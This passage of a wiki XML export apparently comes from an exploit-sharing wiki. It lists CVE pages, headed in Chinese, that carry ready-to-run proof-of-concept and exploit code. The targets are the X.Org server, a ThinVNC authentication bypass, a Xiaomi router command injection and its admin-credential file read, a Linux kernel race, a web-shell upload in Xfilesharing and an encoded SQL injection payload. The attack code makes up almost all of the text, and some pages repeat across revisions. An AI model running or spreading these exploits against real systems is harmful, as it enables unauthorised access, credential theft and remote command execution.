      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; #!/usr/bin/python #coding: utf-8  # ************************************************************************ # *                Author: Marcelo Vázquez (aka s4v..."</comment>
      <origin>1678</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="901" sha1="qucmli08ksccfrxti0p90p4qdjv3ql0" xml:space="preserve">==POC==
&lt;pre&gt;
#!/usr/bin/python
#coding: utf-8

# ************************************************************************
# *                Author: Marcelo Vázquez (aka s4vitar)                 *
# *      X.Org X Server 1.20.4 / X Protocol Version 11 (Stack Overflow)  *
# ************************************************************************

import sys, time
import ctypes as ct

from ctypes import cast
from ctypes.util import find_library

def access_violation(x11, current_display):
  keyboard = (ct.c_char * 1000)()
  x11.XQueryKeymap(current_display, keyboard)

if __name__ == '__main__':

  print "\n[*] Loading x11...\n"
  time.sleep(2)

  x11 = ct.cdll.LoadLibrary(find_library("X11"))
  current_display = x11.XOpenDisplay(None)

  print "[*] Exploiting...\n"
  time.sleep(1)

  try:
    access_violation(x11, current_display)

  except:
    print "\nError...\n"
    sys.exit(1)
&lt;/pre&gt;</text>
      <sha1>qucmli08ksccfrxti0p90p4qdjv3ql0</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-17662 ThinVNC 1.0b1 身份驗證繞過漏洞</title>
    <ns>0</ns>
    <id>1342</id>
    <revision>
      <id>1682</id>
      <timestamp>2021-04-15T06:42:07Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: ThinVNC 1.0b1 - Authentication Bypass # Date: 2019-10-17 # Exploit Author: Nikhith Tumamlapalli # Contributor WarMarX # Vendor Homepage: https:/..."</comment>
      <origin>1682</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="996" sha1="n4xwvu3vr80488ikt77lhx9q0efv44j" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: ThinVNC 1.0b1 - Authentication Bypass
# Date: 2019-10-17
# Exploit Author: Nikhith Tumamlapalli
# Contributor WarMarX
# Vendor Homepage: https://sourceforge.net/projects/thinvnc/
# Software Link: https://sourceforge.net/projects/thinvnc/files/ThinVNC_1.0b1/ThinVNC_1.0b1.zip/download
# Version: 1.0b1
# Tested on: Windows All Platforms
# CVE : CVE-2019-17662

# Description:
# Authentication Bypass via Arbitrary File Read

#!/usr/bin/python3

import sys
import os
import requests

def exploit(host,port):
    url = "http://" + host +":"+port+"/xyz/../../ThinVnc.ini"
    r = requests.get(url)
    body = r.text
    print(body.splitlines()[2])
    print(body.splitlines()[3])



def main():
    if(len(sys.argv)!=3):
        print("Usage:\n{} &lt;host&gt; &lt;port&gt;\n".format(sys.argv[0]))
        print("Example:\n{} 192.168.0.10 5888")
    else:
        port = sys.argv[2]
        host = sys.argv[1]
        exploit(host,port)

if __name__ == '__main__':
    main()
&lt;/pre&gt;</text>
      <sha1>n4xwvu3vr80488ikt77lhx9q0efv44j</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-18370 （小米） Xiaomi Mi WiFi R3G 遠程命令執行漏洞</title>
    <ns>0</ns>
    <id>5729</id>
    <revision>
      <id>6585</id>
      <timestamp>2021-07-08T13:45:55Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==漏洞影響== &lt;/translate&gt; Xiaomi Mi WiFi R3G 2.28.23-stable previous version  ==POC== ===template.xml=== &lt;pre&gt; &lt;?xml version="1.0"?&gt; &lt;root&gt; 	&lt;cla..."</comment>
      <origin>6585</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3379" sha1="9vo9rraz7xo8py4q4wpgrnmuywj3z81" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;
Xiaomi Mi WiFi R3G 2.28.23-stable previous version

==POC==
===template.xml===
&lt;pre&gt;
&lt;?xml version="1.0"?&gt;
&lt;root&gt;
	&lt;class type="1"&gt;
		&lt;item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/&gt;
		&lt;item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/&gt;
		&lt;item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/&gt;
		&lt;item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/&gt;
		&lt;item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/&gt;
		&lt;item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/&gt;
		&lt;item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/&gt;
		&lt;item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/&gt;
		&lt;item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/&gt;
		&lt;item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/&gt;
		&lt;item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/&gt;
		&lt;item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/&gt;
		&lt;item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/&gt;
		&lt;item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/&gt;
	&lt;/class&gt;
	&lt;class type="2"&gt;
		&lt;item url="http://192.168.31.1 -q -O /dev/null;{command}&gt;/tmp/1.txt; exit; wget http://192.168.31.1  "/&gt;
	&lt;/class&gt;
	&lt;class type="3"&gt;
		&lt;item uploadurl="http://www.taobao.com/"/&gt;
		&lt;item uploadurl="http://www.so.com/"/&gt;
		&lt;item uploadurl="http://www.qq.com/"/&gt;
		&lt;item uploadurl="http://www.sohu.com/"/&gt;
		&lt;item uploadurl="http://www.tudou.com/"/&gt;
		&lt;item uploadurl="http://www.360doc.com/"/&gt;
		&lt;item uploadurl="http://www.kankan.com/"/&gt;
		&lt;item uploadurl="http://www.speedtest.cn/"/&gt;
	&lt;/class&gt;
&lt;/root&gt;
&lt;/pre&gt;

===remote_command_execution_vulnerability.py===
&lt;pre&gt;
import os
import tarfile
import requests

# proxies = {"http":"http://127.0.0.1:8080"}
proxies = {}

## get stok
stok = input("stok: ")

## make config file
command = input("command: ")
speed_test_filename = "speedtest_urls.xml"
with open("template.xml","rt") as f:
	template = f.read()
data = template.format(command=command)
# print(data)
with open("speedtest_urls.xml",'wt') as f:
	f.write(data)

with tarfile.open("payload.tar.gz", "w:gz") as tar:
	# tar.add("cfg_backup.des")
	# tar.add("cfg_backup.mbu")
	tar.add("speedtest_urls.xml")

## upload config file
print("start uploading config file ...")
r1 = requests.post("http://192.168.31.1/cgi-bin/luci/;stok={}/api/misystem/c_upload".format(stok), files={"image":open("payload.tar.gz",'rb')}, proxies=proxies)
# print(r1.text)

## exec download speed test, exec command
print("start exec command...")
r2 = requests.get("http://192.168.31.1/cgi-bin/luci/;stok={}/api/xqnetdetect/netspeed".format(stok), proxies=proxies)
# print(r2.text)

## read result file
r3 = requests.get("http://192.168.31.1/api-third-party/download/extdisks../tmp/1.txt", proxies=proxies)
if r3.status_code == 200:
	print("success, vul")
	print(r3.text)
&lt;/pre&gt;

&lt;translate&gt;
==參考==
&lt;/translate&gt;
https://github.com/UltramanGaia/Xiaomi_Mi_WiFi_R3G_Vulnerability_POC/blob/master/report/report.md</text>
      <sha1>9vo9rraz7xo8py4q4wpgrnmuywj3z81</sha1>
    </revision>
    <revision>
      <id>6586</id>
      <parentid>6585</parentid>
      <timestamp>2021-07-08T13:46:28Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>6586</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3401" sha1="42wc86gj6plc18iet4s2rtqzrdbi831" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;
Xiaomi Mi WiFi R3G 2.28.23-stable previous version

==POC==
===template.xml===
&lt;pre&gt;
&lt;?xml version="1.0"?&gt;
&lt;root&gt;
	&lt;class type="1"&gt;
		&lt;item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/&gt;
		&lt;item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/&gt;
		&lt;item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/&gt;
		&lt;item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/&gt;
		&lt;item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/&gt;
		&lt;item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/&gt;
		&lt;item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/&gt;
		&lt;item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/&gt;
		&lt;item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/&gt;
		&lt;item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/&gt;
		&lt;item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/&gt;
		&lt;item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/&gt;
		&lt;item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/&gt;
		&lt;item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/&gt;
	&lt;/class&gt;
	&lt;class type="2"&gt;
		&lt;item url="http://192.168.31.1 -q -O /dev/null;{command}&gt;/tmp/1.txt; exit; wget http://192.168.31.1  "/&gt;
	&lt;/class&gt;
	&lt;class type="3"&gt;
		&lt;item uploadurl="http://www.taobao.com/"/&gt;
		&lt;item uploadurl="http://www.so.com/"/&gt;
		&lt;item uploadurl="http://www.qq.com/"/&gt;
		&lt;item uploadurl="http://www.sohu.com/"/&gt;
		&lt;item uploadurl="http://www.tudou.com/"/&gt;
		&lt;item uploadurl="http://www.360doc.com/"/&gt;
		&lt;item uploadurl="http://www.kankan.com/"/&gt;
		&lt;item uploadurl="http://www.speedtest.cn/"/&gt;
	&lt;/class&gt;
&lt;/root&gt;
&lt;/pre&gt;

===remote_command_execution_vulnerability.py===
&lt;pre&gt;
import os
import tarfile
import requests

# proxies = {"http":"http://127.0.0.1:8080"}
proxies = {}

## get stok
stok = input("stok: ")

## make config file
command = input("command: ")
speed_test_filename = "speedtest_urls.xml"
with open("template.xml","rt") as f:
	template = f.read()
data = template.format(command=command)
# print(data)
with open("speedtest_urls.xml",'wt') as f:
	f.write(data)

with tarfile.open("payload.tar.gz", "w:gz") as tar:
	# tar.add("cfg_backup.des")
	# tar.add("cfg_backup.mbu")
	tar.add("speedtest_urls.xml")

## upload config file
print("start uploading config file ...")
r1 = requests.post("http://192.168.31.1/cgi-bin/luci/;stok={}/api/misystem/c_upload".format(stok), files={"image":open("payload.tar.gz",'rb')}, proxies=proxies)
# print(r1.text)

## exec download speed test, exec command
print("start exec command...")
r2 = requests.get("http://192.168.31.1/cgi-bin/luci/;stok={}/api/xqnetdetect/netspeed".format(stok), proxies=proxies)
# print(r2.text)

## read result file
r3 = requests.get("http://192.168.31.1/api-third-party/download/extdisks../tmp/1.txt", proxies=proxies)
if r3.status_code == 200:
	print("success, vul")
	print(r3.text)
&lt;/pre&gt;

&lt;translate&gt;
==參考== &lt;!--T:2--&gt;
&lt;/translate&gt;
https://github.com/UltramanGaia/Xiaomi_Mi_WiFi_R3G_Vulnerability_POC/blob/master/report/report.md</text>
      <sha1>42wc86gj6plc18iet4s2rtqzrdbi831</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-18371 （小米） Xiaomi Mi WiFi R3G 任意文件讀取漏洞</title>
    <ns>0</ns>
    <id>5733</id>
    <revision>
      <id>6590</id>
      <timestamp>2021-07-08T13:47:47Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==漏洞影響== &lt;/translate&gt; Xiaomi Mi WiFi R3G 2.28.23-stable previous version   ==POC== ===arbitrary_file_read_vulnerability.py=== &lt;pre&gt; import os..."</comment>
      <origin>6590</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1846" sha1="rt7588j68th0dcnzp3628xyhtxiwmfv" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;
Xiaomi Mi WiFi R3G 2.28.23-stable previous version


==POC==
===arbitrary_file_read_vulnerability.py===
&lt;pre&gt;
import os
import re
import time
import base64
import random
import hashlib
import requests
from Crypto.Cipher import AES

# proxies = {"http":"http://127.0.0.1:8080"}
proxies = {}

def get_mac():
	## get mac
	r0 = requests.get("http://192.168.31.1/cgi-bin/luci/web", proxies=proxies)
	mac = re.findall(r'deviceId = \'(.*?)\'', r0.text)[0]
	# print(mac)	
	return mac

def get_account_str():
	## read /etc/config/account
	r1 = requests.get("http://192.168.31.1/api-third-party/download/extdisks../etc/config/account", proxies=proxies)
	print(r1.text)
	account_str = re.findall(r'admin\'? \'(.*)\'', r1.text)[0]
	return account_str

def create_nonce(mac):
	type_ = 0
	deviceId = mac
	time_ = int(time.time())
	rand = random.randint(0,10000)
	return "%d_%s_%d_%d"%(type_, deviceId, time_, rand)

def calc_password(nonce, account_str):
	m = hashlib.sha1()
	m.update((nonce + account_str).encode('utf-8'))
	return m.hexdigest()

mac = get_mac()
account_str = get_account_str()
## login, get stok
nonce = create_nonce(mac)
password = calc_password(nonce, account_str)
data = "username=admin&amp;password={password}&amp;logtype=2&amp;nonce={nonce}".format(password=password,nonce=nonce)
r2 = requests.post("http://192.168.31.1/cgi-bin/luci/api/xqsystem/login", 
	data = data, 
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0",
		"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
	proxies=proxies)
# print(r2.text)
stok = re.findall(r'"token":"(.*?)"',r2.text)[0]
print("stok="+stok)
&lt;/pre&gt;

&lt;translate&gt;
==參考==
&lt;/translate&gt;

https://github.com/UltramanGaia/Xiaomi_Mi_WiFi_R3G_Vulnerability_POC/blob/master/report/report.md</text>
      <sha1>rt7588j68th0dcnzp3628xyhtxiwmfv</sha1>
    </revision>
    <revision>
      <id>6591</id>
      <parentid>6590</parentid>
      <timestamp>2021-07-08T13:48:34Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>6591</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1868" sha1="0dg1s408lshj0ve4skmy4d17dju272b" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;
Xiaomi Mi WiFi R3G 2.28.23-stable previous version


==POC==
===arbitrary_file_read_vulnerability.py===
&lt;pre&gt;
import os
import re
import time
import base64
import random
import hashlib
import requests
from Crypto.Cipher import AES

# proxies = {"http":"http://127.0.0.1:8080"}
proxies = {}

def get_mac():
	## get mac
	r0 = requests.get("http://192.168.31.1/cgi-bin/luci/web", proxies=proxies)
	mac = re.findall(r'deviceId = \'(.*?)\'', r0.text)[0]
	# print(mac)	
	return mac

def get_account_str():
	## read /etc/config/account
	r1 = requests.get("http://192.168.31.1/api-third-party/download/extdisks../etc/config/account", proxies=proxies)
	print(r1.text)
	account_str = re.findall(r'admin\'? \'(.*)\'', r1.text)[0]
	return account_str

def create_nonce(mac):
	type_ = 0
	deviceId = mac
	time_ = int(time.time())
	rand = random.randint(0,10000)
	return "%d_%s_%d_%d"%(type_, deviceId, time_, rand)

def calc_password(nonce, account_str):
	m = hashlib.sha1()
	m.update((nonce + account_str).encode('utf-8'))
	return m.hexdigest()

mac = get_mac()
account_str = get_account_str()
## login, get stok
nonce = create_nonce(mac)
password = calc_password(nonce, account_str)
data = "username=admin&amp;password={password}&amp;logtype=2&amp;nonce={nonce}".format(password=password,nonce=nonce)
r2 = requests.post("http://192.168.31.1/cgi-bin/luci/api/xqsystem/login", 
	data = data, 
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0",
		"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
	proxies=proxies)
# print(r2.text)
stok = re.findall(r'"token":"(.*?)"',r2.text)[0]
print("stok="+stok)
&lt;/pre&gt;

&lt;translate&gt;
==參考== &lt;!--T:2--&gt;
&lt;/translate&gt;

https://github.com/UltramanGaia/Xiaomi_Mi_WiFi_R3G_Vulnerability_POC/blob/master/report/report.md</text>
      <sha1>0dg1s408lshj0ve4skmy4d17dju272b</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-18371 （小米） Xiaomi Mi WiFi R3G 任意文件讀取漏洞/zh-hant</title>
    <ns>0</ns>
    <id>6106</id>
    <revision>
      <id>6976</id>
      <timestamp>2021-07-10T08:59:45Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==參考=="</comment>
      <origin>6976</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1796" sha1="3xb9wkmf02bu9h5m1wtth9jf43ufjv9" xml:space="preserve">&lt;languages /&gt;
==漏洞影響==
Xiaomi Mi WiFi R3G 2.28.23-stable previous version


==POC==
===arbitrary_file_read_vulnerability.py===
&lt;pre&gt;
import os
import re
import time
import base64
import random
import hashlib
import requests
from Crypto.Cipher import AES

# proxies = {"http":"http://127.0.0.1:8080"}
proxies = {}

def get_mac():
	## get mac
	r0 = requests.get("http://192.168.31.1/cgi-bin/luci/web", proxies=proxies)
	mac = re.findall(r'deviceId = \'(.*?)\'', r0.text)[0]
	# print(mac)	
	return mac

def get_account_str():
	## read /etc/config/account
	r1 = requests.get("http://192.168.31.1/api-third-party/download/extdisks../etc/config/account", proxies=proxies)
	print(r1.text)
	account_str = re.findall(r'admin\'? \'(.*)\'', r1.text)[0]
	return account_str

def create_nonce(mac):
	type_ = 0
	deviceId = mac
	time_ = int(time.time())
	rand = random.randint(0,10000)
	return "%d_%s_%d_%d"%(type_, deviceId, time_, rand)

def calc_password(nonce, account_str):
	m = hashlib.sha1()
	m.update((nonce + account_str).encode('utf-8'))
	return m.hexdigest()

mac = get_mac()
account_str = get_account_str()
## login, get stok
nonce = create_nonce(mac)
password = calc_password(nonce, account_str)
data = "username=admin&amp;password={password}&amp;logtype=2&amp;nonce={nonce}".format(password=password,nonce=nonce)
r2 = requests.post("http://192.168.31.1/cgi-bin/luci/api/xqsystem/login", 
	data = data, 
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0",
		"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
	proxies=proxies)
# print(r2.text)
stok = re.findall(r'"token":"(.*?)"',r2.text)[0]
print("stok="+stok)
&lt;/pre&gt;

==參考==

https://github.com/UltramanGaia/Xiaomi_Mi_WiFi_R3G_Vulnerability_POC/blob/master/report/report.md</text>
      <sha1>3xb9wkmf02bu9h5m1wtth9jf43ufjv9</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-18683 Linux kernel through 5.3.8 特權提升漏洞</title>
    <ns>0</ns>
    <id>1683</id>
    <revision>
      <id>2087</id>
      <timestamp>2021-05-04T03:08:44Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; /*  * PoC crashing the kernel using the bug in drivers/media/platform/vivid.  * Turned out that this bug is exploitable.  * Just for fun.  */  #define _GNU_SOURC..."</comment>
      <origin>2087</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2408" sha1="f6qmabhtbt8form79qln3tavbkrjcif" xml:space="preserve">==POC==
&lt;pre&gt;
/*
 * PoC crashing the kernel using the bug in drivers/media/platform/vivid.
 * Turned out that this bug is exploitable.
 * Just for fun.
 */

#define _GNU_SOURCE

#include &lt;fcntl.h&gt;
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/prctl.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;pthread.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/mman.h&gt;

#define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)

#define THREADS_N 2
#define LOOP_N 10000

unsigned char *buf = NULL;

void *racer(void *arg)
{
	unsigned long n = (unsigned long)arg;
	unsigned long cpu_n = n % 2;
	cpu_set_t single_cpu;
	int ret = 0;
	unsigned long loop = 0;

	CPU_ZERO(&amp;single_cpu);
	CPU_SET(cpu_n, &amp;single_cpu);
	ret = sched_setaffinity(0, sizeof(single_cpu), &amp;single_cpu);
	if (ret != 0)
		err_exit("[-] sched_setaffinity for a single CPU");

	printf("[+] racer #%lu is on the start on CPU %lu\n", n, cpu_n);

	for (loop = 0; loop &lt; LOOP_N; loop++) {
		int fd = 0;

		/* printf("  racer %lu, loop %lu\n", n, loop); */

		fd = open("/dev/video0", O_RDWR);
		if (fd &lt; 0)
			err_exit("[-] open /dev/video0");

		read(fd, buf, 0xfffded);
		close(fd);

		usleep(n);
	}

	return NULL;
}

int main(void)
{
	int ret = -1;
	cpu_set_t all_cpus;
	pthread_t th[THREADS_N] = { 0 };
	long i = 0;

	printf("[!] gonna work with /dev/video0\n");
	printf("[!] please check that:\n");
	printf("\t vivid driver is loaded\n");
	printf("\t /dev/video0 is the V4L2 capture device\n");
	printf("\t you are logged in (Ubuntu adds RW ACL for /dev/video0)\n");

	ret = sched_getaffinity(0, sizeof(all_cpus), &amp;all_cpus);
	if (ret != 0)
		err_exit("[-] sched_getaffinity");

	if (CPU_COUNT(&amp;all_cpus) &lt; 2) {
		printf("[-] not enough CPUs for racing\n");
		exit(EXIT_FAILURE);
	}

	printf("[+] we have %d CPUs for racing\n", CPU_COUNT(&amp;all_cpus));
	fflush(NULL);

	buf = mmap(NULL, 0x1000000, PROT_READ | PROT_WRITE,
					MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (buf == MAP_FAILED)
		err_exit("[-] mmap");
	else
		printf("[+] buf for reading is mmaped at %p\n", buf);

	for (i = 0; i &lt; THREADS_N; i++) {
		ret = pthread_create(&amp;th[i], NULL, racer, (void *)i);
		if (ret != 0)
			err_exit("[-] pthread_create for racer");
	}

	for (i = 0; i &lt; THREADS_N; i++) {
		ret = pthread_join(th[i], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join");
	}

	printf("[-] racing is failed, try it again\n");

	exit(EXIT_FAILURE);
}
&lt;/pre&gt;</text>
      <sha1>f6qmabhtbt8form79qln3tavbkrjcif</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-18951 Xfilesharing 2.5.1 本地文件上傳shell漏洞</title>
    <ns>0</ns>
    <id>4522</id>
    <revision>
      <id>5204</id>
      <timestamp>2021-06-17T00:47:23Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==漏洞影響== &lt;/translate&gt; &lt;pre&gt; Version: &lt;=2.5.1 &lt;/pre&gt;  ==EXP== &lt;pre&gt; &lt;form action="http://&lt;target&gt;/cgi-bin/up.cgi" method="post" enctype="multi..."</comment>
      <origin>5204</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="387" sha1="syu9z64cb6a6v1vgs7p9rj297aduhvg" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;
&lt;pre&gt;
Version: &lt;=2.5.1
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
&lt;form action="http://&lt;target&gt;/cgi-bin/up.cgi" method="post" enctype="multipart/form-data"&gt;
   &lt;input type="text" name="sid" value="joe"&gt;
   &lt;input type="file" name="file"&gt;
   &lt;input type="submit" value="Upload" name="submit"&gt;
&lt;/form&gt;

Shell : http://&lt;target&gt;/cgi-bin/temp/joe/she
&lt;/pre&gt;</text>
      <sha1>syu9z64cb6a6v1vgs7p9rj297aduhvg</sha1>
    </revision>
    <revision>
      <id>5205</id>
      <parentid>5204</parentid>
      <timestamp>2021-06-17T00:48:35Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>5205</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="398" sha1="okkxo5npbxya11w3rmxpzetbmfnzm4p" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
Version: &lt;=2.5.1
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
&lt;form action="http://&lt;target&gt;/cgi-bin/up.cgi" method="post" enctype="multipart/form-data"&gt;
   &lt;input type="text" name="sid" value="joe"&gt;
   &lt;input type="file" name="file"&gt;
   &lt;input type="submit" value="Upload" name="submit"&gt;
&lt;/form&gt;

Shell : http://&lt;target&gt;/cgi-bin/temp/joe/she
&lt;/pre&gt;</text>
      <sha1>okkxo5npbxya11w3rmxpzetbmfnzm4p</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-18951 Xfilesharing 2.5.1 本地文件上傳shell漏洞/zh-cn</title>
    <ns>0</ns>
    <id>4528</id>
    <revision>
      <id>5211</id>
      <timestamp>2021-06-17T00:51:29Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==漏洞影响=="</comment>
      <origin>5211</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="362" sha1="hwbl3qceesgzz9n2zukktq4m6fxm94j" xml:space="preserve">&lt;languages /&gt;
==漏洞影响==
&lt;pre&gt;
Version: &lt;=2.5.1
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
&lt;form action="http://&lt;target&gt;/cgi-bin/up.cgi" method="post" enctype="multipart/form-data"&gt;
   &lt;input type="text" name="sid" value="joe"&gt;
   &lt;input type="file" name="file"&gt;
   &lt;input type="submit" value="Upload" name="submit"&gt;
&lt;/form&gt;

Shell : http://&lt;target&gt;/cgi-bin/temp/joe/she
&lt;/pre&gt;</text>
      <sha1>hwbl3qceesgzz9n2zukktq4m6fxm94j</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-19113 新蜂商城SQL注入漏洞</title>
    <ns>0</ns>
    <id>5785</id>
    <revision>
      <id>6654</id>
      <timestamp>2021-07-10T07:22:47Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==漏洞影響== &lt;/translate&gt; newbee-mall version before 2019-10-23  ==POC== &lt;pre&gt; http://&lt;target&gt;/search?goodsCategoryId=&amp;keyword=%5C%25%27%29%29%20..."</comment>
      <origin>6654</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="687" sha1="hfh91hstlv0kcgcb74zt6vmj7rgpzmr" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;
newbee-mall version before 2019-10-23

==POC==
&lt;pre&gt;
http://&lt;target&gt;/search?goodsCategoryId=&amp;keyword=%5C%25%27%29%29%20%55%4E%49%4F%4E%20%41%4C%4C%20%53%45%4C%45%43%54%20%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%43%4F%4E%43%41%54%28%30%78%37%31%37%36%36%32%37%38%37%31%2C%49%46%4E%55%4C%4C%28%43%41%53%54%28%43%55%52%52%45%4E%54%5F%55%53%45%52%28%29%20%41%53%20%43%48%41%52%29%2C%30%78%32%30%29%2C%30%78%37%31%36%32%37%38%36%62%37%31%29%2C%4E%55%4C%4C%2C%4E%55%4C%4C%23&amp;orderBy=default
&lt;/pre&gt;</text>
      <sha1>hfh91hstlv0kcgcb74zt6vmj7rgpzmr</sha1>
    </revision>
    <revision>
      <id>6673</id>
      <parentid>6654</parentid>
      <timestamp>2021-07-10T07:23:51Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>6673</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
